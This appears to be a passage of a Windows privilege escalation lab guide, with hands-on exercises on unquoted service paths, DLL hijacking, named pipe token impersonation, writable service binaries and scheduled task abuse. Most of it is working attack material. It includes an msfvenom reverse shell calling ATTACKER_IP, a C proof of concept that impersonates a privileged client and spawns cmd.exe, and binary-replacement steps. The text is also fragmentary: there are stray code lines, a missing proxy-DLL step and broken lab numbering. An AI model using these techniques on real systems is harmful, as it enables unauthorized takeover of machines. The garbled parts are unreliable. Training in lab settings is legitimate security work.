Service Misconfigurations

Unquoted Service Paths

If a service binary path has spaces and isn't quoted, Windows tries each truncated path in order. Place a malicious binary at an earlier path to hijack execution.

# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerUp
Get-UnquotedService

# Example vulnerable path:
# C:\Program Files\Vulnerable App\Service Binary\svc.exe
# Windows tries in order:
#   C:\Program.exe
#   C:\Program Files\Vulnerable.exe       ← place payload here
#   C:\Program Files\Vulnerable App\Service.exe
#   C:\Program Files\Vulnerable App\Service Binary\svc.exe
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Vulnerable.exe

# Place in: C:\Program Files\Vulnerable.exe
# Restart the service
sc stop VulnService

DLL Search Order Hijacking

Windows DLL search order: application directory → system directories → PATH directories. If an application loads a DLL from a writable directory in the search path, hijack it.

# Find writable directories in PATH
$env:PATH -split ';' | ForEach-Object {
    $path = $_
    try {
        $acl = Get-Acl $path
        $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl|Modify" -and
            $_.IdentityReference -match "Users|Everyone|Authenticated"
        } | ForEach-Object { Write-Host "[!] Writable: $path — $($_.IdentityReference)" }
    } catch {}
}

# Use Process Monitor to find DLL load attempts
# Filter: Operation = "CreateFile", Result = "NAME NOT FOUND", Path ends with ".dll"

# 1. Application directory
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory

} | Format-Table -AutoSize
// Step 3: Create a proxy DLL (forwards legitimate calls + runs payload)

Lab 9: Named Pipe Impersonation

Hard

Objective: Create a named pipe server, trick a privileged process into connecting, and impersonate its token.

// named_pipe_impersonate.c — Named pipe impersonation PoC
// Compile: cl.exe named_pipe_impersonate.c advapi32.lib /Fe:pipe_impersonate.exe
#include <windows.h>
#include <stdio.h>

int main() {
    // Step 1: Create a named pipe
    HANDLE hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\privesc_lab",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe failed: %lu\n", GetLastError());
        return 1;
    }
    printf("[*] Named pipe created: \\\\.\\pipe\\privesc_lab\n");
    printf("[*] Waiting for connection...\n");

    // Step 2: Wait for a privileged client to connect
    ConnectNamedPipe(hPipe, NULL);
    printf("[+] Client connected!\n");

    // Step 3: Impersonate the client
    if (ImpersonateNamedPipeClient(hPipe)) {
        printf("[+] Impersonation successful!\n");

        // Check who we are now
        char username[256];
        DWORD len = sizeof(username);
        GetUserNameA(username, &len);
        printf("[+] Running as: %s\n", username);

        // Spawn a shell with the impersonated token
        STARTUPINFOA si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessAsUserA(NULL, "cmd.exe", NULL, NULL, NULL,
            FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

        RevertToSelf();
    }

    CloseHandle(hPipe);
    return 0;
}

Objective: Replace a service executable with a payload when the binary path is writable by your user.

# Step 1: Find services with writable binary paths
Get-CimInstance Win32_Service | ForEach-Object {
    $path = ($_.PathName -replace '"','') -replace '\s+/.*','' -replace '\s+-.*',''
    if (Test-Path $path) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        $writable = $acl.Access | Where-Object {
            $_.FileSystemRights -match "Write|FullControl|Modify" -and
            $_.IdentityReference -match "Users|Everyone|Authenticated"
        }
        if ($writable) {
            [PSCustomObject]@{
                Service = $_.Name
                Path    = $path
                RunAs   = $_.StartName
                Perm    = $writable.FileSystemRights
            }
        }
    }
} | Format-Table -AutoSize

# Step 2: Backup and replace
copy "C:\VulnApp\service.exe" "C:\VulnApp\service.exe.bak"
copy C:\temp\reverse.exe "C:\VulnApp\service.exe"

# Step 3: Restart the service
sc stop VulnService
sc start VulnService

Tasks:

  1. Identify a service with a writable binary path using the PowerShell script above.
  2. Backup the original binary before replacing.
  3. Replace with your payload and restart the service.
  4. Restore the original binary after getting your shell.

Lab 11: Scheduled Task Abuse

Medium

Objective: Find and exploit scheduled tasks running as privileged users with writable script paths.

# Step 1: Enumerate scheduled tasks
schtasks /query /fo LIST /v | findstr /i "Task Name\|Run As User\|Task To Run"

# PowerShell — more detailed
Get-ScheduledTask | ForEach-Object {
    $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        Name    = $_.TaskName
        Path    = $_.TaskPath
        RunAs   = $_.Principal.UserId
        Action  = ($_.Actions | Select-Object -First 1).Execute
        Args    = ($_.Actions | Select-Object -First 1).Arguments
        Status  = $_.State
    }
} | Where-Object { $_.RunAs -match "SYSTEM|Administrator" } | Format-Table -AutoSize

# Step 2: Check if the script/binary is writable

# Step 4: Wait for the task to run, or trigger it
schtasks /run /tn "VulnTask"

Tasks:

  1. Find all scheduled tasks running as SYSTEM or Administrator.
  2. Check if any task actions point to writable files or directories.
  3. Inject a payload into the writable script.
  4. Wait for or trigger the task and verify privilege escalation.
